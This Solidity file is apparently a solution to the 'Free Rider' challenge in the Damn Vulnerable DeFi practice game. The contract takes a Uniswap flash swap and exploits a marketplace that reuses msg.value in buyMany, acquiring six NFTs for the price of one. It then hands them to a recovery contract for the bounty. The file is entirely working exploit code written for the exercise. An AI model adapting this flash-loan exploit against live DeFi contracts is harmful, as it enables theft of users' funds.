pragma solidity =0.8.25;

import {IERC721} from "@openzeppelin/contracts/token/ERC721/IERC721.sol";
import {IERC721Receiver} from "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";
import {WETH} from "solmate/tokens/WETH.sol";
import {FreeRiderNFTMarketplace} from "../../src/free-rider/FreeRiderNFTMarketplace.sol";
import {FreeRiderRecoveryManager} from "../../src/free-rider/FreeRiderRecoveryManager.sol";
import {DamnValuableNFT} from "../../src/DamnValuableNFT.sol";
import {IUniswapV2Pair} from "@uniswap/v2-core/contracts/interfaces/IUniswapV2Pair.sol";



// Idea: flash swap 15eth to this contract
contract FreeRiderExploiter is IERC721Receiver {
    WETH weth;
    IUniswapV2Pair uniswapPair;
    FreeRiderNFTMarketplace market;
    FreeRiderRecoveryManager recovery;
    DamnValuableNFT token;
    address owner;

    uint AMOUNT_OF_NFTS = 6;
    uint NFT_PRICE = 15 ether;

    constructor(
        WETH _weth,
        IUniswapV2Pair _uniswapPair,
        FreeRiderNFTMarketplace _market,
        FreeRiderRecoveryManager _recovery,
        DamnValuableNFT _token
    ) payable {
        weth = _weth;
        uniswapPair = _uniswapPair;
        market = _market;
        recovery = _recovery;
        token = _token;
        owner = msg.sender;
    }

    function attack() public{
        uniswapPair.swap(NFT_PRICE, 0, address(this), new bytes(1));

    }

    function uniswapV2Call(address sender, uint amount0, uint amount1, bytes calldata data) public{
        // Convert weth
        weth.withdraw(weth.balanceOf(address(this)));
        //Buy the NFT
        uint256[] memory tokenIds = new uint256[](AMOUNT_OF_NFTS);
        for (uint i = 0; i < AMOUNT_OF_NFTS; i++) {
            tokenIds[i] = i;
        }
        market.buyMany{value: NFT_PRICE}(tokenIds);

        //Transfer to the recovery
        for (uint i = 0; i < AMOUNT_OF_NFTS; i++) {
            assert(token.ownerOf(i) == address(this));
            token.safeTransferFrom(address(this),address(recovery), i, abi.encodePacked(bytes32(uint256(uint160(owner)))));
        }

        weth.deposit{value: NFT_PRICE + 1 ether}();
        weth.transfer(msg.sender, NFT_PRICE + 1 ether);
    }

    function onERC721Received(address, address, uint256 _tokenId, bytes memory _data) external returns (bytes4) {
        return this.onERC721Received.selector;
    }

    receive() external payable {}
}